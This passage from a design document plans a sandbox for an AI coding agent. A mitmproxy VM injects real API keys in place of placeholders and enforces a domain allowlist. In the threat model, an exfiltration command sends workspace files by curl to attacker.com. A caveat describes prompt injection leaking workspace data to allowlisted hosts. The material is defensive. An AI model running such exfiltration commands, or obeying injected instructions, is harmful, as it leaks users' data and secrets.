   `ANTHROPIC_API_KEY`). Generates `ca.crt`/`ca.key` if absent.
2. `container network create --subnet 192.168.65.0/24 proxy-net-my-service-7H3kQ9`.
3. Runs the proxy VM, mounting `secrets.env`, the policy, and the CA read-only:
   ```
   container run -d --name proxy-my-service-7H3kQ9 \
     --network proxy-net-my-service-7H3kQ9 \
     --mount type=bind,source=$HOME/.config/project-sandbox/secrets.env,target=/run/secrets.env,readonly \
     --mount type=bind,source=./my-service/.project-sandbox/proxy,target=/etc/proxy,readonly \
     project-sandbox-proxy:latest
   ```
   Entrypoint: `mitmdump -s /etc/proxy/addon/enforcer.py --mode regular@8080
   --mode transparent@8081 --set confdir=/etc/proxy-ca --set ssl_insecure=false`.
4. CLI polls `container inspect proxy-my-service-7H3kQ9` → `192.168.65.2`.
5. CLI templates the agent VM's `init-firewall.sh` with `PROXY_IP=192.168.65.2`,
   builds the agent image (CA baked in), then runs it with config vars +
   placeholders (never the real secret values):
   ```
   container run -d --name agent-my-service-7H3kQ9 \
     --network proxy-net-my-service-7H3kQ9 \
     --mount type=bind,source=./my-service,target=/workspace,readwrite \
     -e ANTHROPIC_API_KEY=PLACEHOLDER_ANTHROPIC \
     -e HTTPS_PROXY=http://192.168.65.2:8080 \
     -e HTTP_PROXY=http://192.168.65.2:8080 \
     -e NO_PROXY=localhost,127.0.0.1 \
     project-sandbox-agent-claude:my-service
   ```
6. Claude Code starts with `ANTHROPIC_API_KEY=PLACEHOLDER_ANTHROPIC`. It opens a
   connection toward `api.anthropic.com:443`, but Node's `undici` ProxyAgent sees
   `HTTPS_PROXY` and connects to `192.168.65.2:8080`. iptables allows that and would
   have DROPPED a direct one.
7. Claude Code sends `CONNECT api.anthropic.com:443`. `enforcer.py`'s `http_connect`
   matches the host in `domains:`, allowed for `schemes: [https]`. CONNECT → 200.
8. TLS handshake: mitmproxy presents a cert for `api.anthropic.com` signed by our
   project CA. Node accepts it (CA in the system store + `NODE_EXTRA_CA_CERTS`).
9. Claude Code sends `POST /v1/messages` with `x-api-key: PLACEHOLDER_ANTHROPIC`.
10. `enforcer.py.request(flow)`: matches `path.prefix: /v1/`, then
    `injector.replace_header(flow, "x-api-key", env_secret("ANTHROPIC_API_KEY"))`.
    The header now holds the real `sk-ant-...`; `on_existing_header: replace`
    overwrites the placeholder. (No body scan runs.)
11. mitmproxy opens a real TLS connection to `api.anthropic.com:443` (verifying its
    cert against the system Mozilla bundle in the proxy VM) and forwards the request.
12. Anthropic returns `200` with `text/event-stream`. The `responseheaders` hook sets
    `flow.response.stream = True`; chunks stream through to the agent unbuffered.
13. Logs at `~/Library/Logs/project-sandbox/my-service-7H3kQ9.jsonl` record one entry
    per request — `{ts, host, path, method, status, secret_injected: true}` — with no
    real key in any line.

At no point does the agent VM hold a real Anthropic key (or, under Bedrock, real AWS
creds) in memory, env, filesystem, or `/proc`. A malicious npm package reading
`/proc/self/environ` sees `PLACEHOLDER_ANTHROPIC`; `curl https://attacker.com -d
"$(cat /workspace/...)"` is denied at the CONNECT layer.

---

#### Recommendations (plan)

**Stage 1 — Minimum viable:**
1. Single `.env` ingestion: CLI reads `secrets.env`, partitions config vs secret per
   policy, injects config + placeholders into the agent VM, mounts the full `.env`
   into the proxy VM only.
2. Generate per-project mitmproxy CA, bake it into the agent VM image.
3. Set `HTTPS_PROXY` env in the agent VM; lock iptables to ALLOW only the proxy IP.
4. Port the mitmproxy `enforcer.py` addon; require macOS 26 + apple/container 0.11+.
5. Credential injection (`transform.request.headers.<H>.secret` referencing a `.env`
   key).
6. Default policy: `claude`, `codex`, `github`, `registry.npmjs.org` allowlisted.
7. E2E tests #1 and #2 passing.

**Stage 2 — Bedrock + ergonomics:**
1. SigV4 `sign:` transform at the proxy for Bedrock (AWS creds held proxy-side).
2. `--keychain` to assemble `secrets.env` from macOS Keychain.
3. `passthrough:` escape hatch with security warnings.
4. CA rotation tooling and expiry warnings.
5. Validate SSE streaming passthrough (`flow.response.stream`).

**Stage 3 — Stretch:**
1. `--shared-proxy` mode for multi-agent setups (one proxy serving several agent VMs).
2. Devcontainer mode via docker-compose generation.
3. cosign + SLSA provenance + CycloneDX SBOM for the proxy image.
4. HTTP/3 transparent mode if a critical upstream adopts QUIC.

**Benchmarks / triggers that should change the plan:**
- If apple/container container-to-container networking has show-stopper bugs at
  macOS 26.0: ship with a single combined VM (proxy + agent in one VM) but with the
  proxy running as a different uid that the iptables `--uid-owner` filter excludes
  from REDIRECT. Strictly worse for compromise containment, but unblocks shipping.
- If Anthropic introduces certificate pinning at the SDK level: the MITM design
  degrades to CONNECT-level allowlisting for `api.anthropic.com` and the agent must
  hold the real key. At that point `project-sandbox` should warn that injection is
  impossible for Anthropic and recommend Bedrock (SigV4 at the proxy) or OAuth/PKCE.

---

#### Caveats

1. **macOS 15 not supported.** Inter-container networking requires macOS 26.
   `project-sandbox` must hard-fail with a clear message on macOS 15.
2. **No IP pinning in apple/container** (issue #282). Work around with
   `container inspect | jq` and template the IP into iptables at runtime. If the proxy
   VM restarts, the agent VM must also restart — a CLI-managed restart-pair.
3. **HTTP/3 outbound is forced-downgraded.** mitmproxy regular mode does not handle
   CONNECT-tunneled QUIC. If an upstream ships QUIC-only endpoints, switch to
   transparent mode for those hosts.
4. **Certificate-pinned upstreams break the model.** Anything in `passthrough:` cannot
   have credentials injected. If a critical SDK starts pinning, the operator must keep
   the secret in the agent VM, defeating the threat model for that host.
5. **No DLP / outbound secret scanning.** This is a deliberate scope decision: we rely
   on destination allowlist + credential non-possession, not entropy/detector scanning
   of request bodies. A sufficiently clever prompt-injection could, in principle, leak
   a secret the agent *does* hold (e.g. workspace contents) to an allowlisted host. The
   mitigations are (a) the agent holds no long-lived API credentials, and (b) the
   canary tripwires above for after-the-fact detection.
6. **The proxy itself is a target.** A malicious dependency in the proxy image is
   catastrophic. Pin all Python deps with `pip-compile --generate-hashes`, build with
   `--no-cache-dir`, sign with `cosign`, publish a CycloneDX SBOM + SLSA provenance.
7. **Multi-agent / parallel worktrees.** Each worktree gets its own proxy VM and
   network → N×2 VMs for N concurrent agents. On Apple Silicon with 16 GB RAM, ~4
   concurrent agents is realistic; 8+ may hit memory pressure. `--shared-proxy` (one
   proxy serving multiple agent VMs) is the opt-in mitigation, with the caveat that one
   project's policy then affects another.
8. **Policy verbatim-extraction caveat.** The `services:`/`domains:` schema above is
   from agent-sandbox's `docs/policy/schema.md` and README, which are authoritative for
   the top-level keys but not necessarily complete for every preset's expansion.
   Confirm the exact `service_catalog.py` contents before shipping a default policy
   that relies on the `claude`, `codex`, `gemini`, `copilot`, or `github` presets.
